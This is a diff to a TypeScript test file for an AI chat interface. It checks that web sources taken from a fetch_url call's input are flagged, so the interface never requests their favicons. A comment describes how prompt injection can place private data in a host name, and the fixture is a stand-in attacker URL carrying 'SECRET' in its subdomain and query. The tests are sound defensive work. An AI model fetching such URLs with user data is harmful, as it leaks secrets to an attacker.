@@ -10,6 +10,7 @@ import {
 	buildFileProductionActivityItem,
 	buildToolActivityItem,
 	buildToolActivitySummary,
+	getToolWebSources,
 	parseAtlasActivityDetails,
 	runPythonObject,
 	toolElapsedLabel,
@@ -1578,5 +1579,72 @@ describe("a failed create_artifact / edit_artifact row (RC-A #2)", () => {
 			],
 			result: null,
 		});
+	});
+});
+
+describe("a source that came from a call's input, not from its result", () => {
+	// A read row with no page back shows the addresses the call was GIVEN, so it never
+	// renders empty. Those are the model's own words (a prompt injection can put private
+	// data in a host), so a row marks them: the host's favicon is a request made on the
+	// model's behalf, and is never asked for (docs/plans/exfil-channels).
+	const REFUSED = "https://secret-0123abcd.attacker.test/page?d=SECRET";
+
+	it("marks every source taken from the call's input", () => {
+		const sources = getToolWebSources(
+			toolCall({
+				name: "fetch_url",
+				input: { url: REFUSED },
+			}),
+		);
+
+		expect(sources).toEqual([
+			{
+				title: "secret-0123abcd.attacker.test",
+				url: REFUSED,
+				fromInput: true,
+			},
+		]);
+	});
+
+	it("leaves a source the call returned unmarked, and prefers it to the input", () => {
+		const sources = getToolWebSources(
+			toolCall({
+				name: "fetch_url",
+				input: { url: REFUSED },
+				candidates: [
+					{
+						id: "c1",
+						title: "Cork city forecast",
+						url: "https://met.ie/cork",
+						sourceType: "web",
+					},
+				] as ToolCallSegment["candidates"],
+			}),
+		);
+
+		expect(sources).toHaveLength(1);
+		expect(sources[0].url).toBe("https://met.ie/cork");
+		expect(sources[0]).not.toHaveProperty("fromInput");
+	});
+
+	it("carries the mark into the row's body", () => {
+		const item = buildToolActivityItem(
+			toolCall({ name: "fetch_url", input: { url: REFUSED } }),
+			"k-input",
+			translate,
+		);
+
+		expect(item.body).toMatchObject({
+			kind: "page",
+			sources: [{ url: REFUSED, fromInput: true }],
+		});
+	});
+
+	it("never reads a search's query as a source", () => {
+		expect(
+			getToolWebSources(
+				toolCall({ name: "research_web", input: { query: REFUSED } }),
+			),
+		).toEqual([]);
 	});
 });
